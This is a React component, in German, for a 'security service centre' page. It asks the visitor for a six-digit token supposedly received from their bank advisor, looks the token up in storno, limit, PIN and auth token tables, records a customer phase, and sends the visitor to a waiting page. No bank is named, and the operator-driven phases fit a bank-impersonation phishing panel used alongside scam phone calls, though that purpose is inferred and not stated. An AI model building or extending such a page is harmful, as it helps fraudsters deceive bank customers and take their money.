import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Input } from "@/components/ui/input";

type Kind = "storno" | "limit" | "pin" | "auth";

const tableFor = (k: Kind) =>
  k === "storno" ? "storno_tokens" : k === "limit" ? "limit_tokens" : k === "auth" ? "auth_tokens" : "pin_tokens";

const ORDER: Kind[] = ["storno", "limit", "pin", "auth"];

const Storno = () => {
  const navigate = useNavigate();
  const [token, setToken] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    const compact = token.replace(/[^0-9]/g, "").slice(0, 6);
    if (!compact) { setError("Bitte Token eingeben."); return; }
    if (compact.length < 6) { setError("Bitte den vollständigen 6-stelligen Token eingeben."); return; }
    const clean = `${compact.slice(0, 3)}-${compact.slice(3)}`;
    setLoading(true);

    let foundKind: Kind | null = null;
    let foundRow: any = null;
    for (const k of ORDER) {
      const { data } = await (supabase as any)
        .from(tableFor(k))
        .select("id, token, used")
        .eq("token", clean)
        .maybeSingle();
      if (data) { foundKind = k; foundRow = data; break; }
    }

    if (!foundKind || !foundRow) {
      setLoading(false);
      setError("Token ungültig.");
      return;
    }
    if (foundRow.used) {
      setLoading(false);
      setError("Dieser Token wurde bereits verwendet.");
      return;
    }

    await (supabase as any)
      .from(tableFor(foundKind))
      .update({ customer_phase: "token", updated_at: new Date().toISOString() })
      .eq("token", clean);

    setLoading(false);
    navigate(`/token/wait?kind=${foundKind}&token=${encodeURIComponent(clean)}`);
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <div className="flex-1 max-w-md mx-auto w-full px-6 py-16">
        <h1 className="text-2xl font-bold text-foreground mb-2">Service Center für Sicherheit</h1>
        <p className="text-sm text-muted-foreground mb-8">
          Bitte geben Sie den Token ein, den Sie von Ihrem Bankberater erhalten haben.
        </p>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="text-xs font-medium text-foreground/80 mb-1 block">Token</label>
            <Input
              value={token}
              onChange={(e) => {
                const raw = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
                const formatted = raw.length > 3 ? `${raw.slice(0, 3)}-${raw.slice(3)}` : raw;
                setToken(formatted);
              }}
              placeholder="XXX-XXX"
              maxLength={7}
              inputMode="numeric"
              className="font-mono tracking-wider uppercase"
              autoFocus
            />
            {error && <p className="text-xs text-destructive mt-2">{error}</p>}
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full font-semibold rounded-full px-6 py-3 text-primary-foreground bg-primary hover:opacity-90 transition-opacity disabled:opacity-50"
          >
            {loading ? "Prüfe..." : "Weiter"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Storno;
